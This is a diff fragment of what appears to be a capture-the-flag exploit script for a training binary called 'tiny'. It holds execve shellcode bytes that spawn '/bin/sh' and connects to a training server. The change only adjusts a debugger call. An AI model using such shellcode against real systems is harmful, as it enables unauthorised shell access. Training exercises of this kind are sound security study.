@@ -17,7 +17,7 @@ shellcode = b"\x6A\x3B\x58\x31\xF6\x31\xD2\x0F\x05"
 
 #ncat --ssl back-to-shell.training.offensivedefensive.it 8080
 if args.GDB:
-    p = gdb.debug("./tiny" , args=[b"/bin/sh\0"], gdbscript=COMMANDS)
+    p = gdb.debug(["./tiny" ,b"/bin/sh\0"], gdbscript=COMMANDS)
 elif args.REMOTE:
     p = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)
 else:
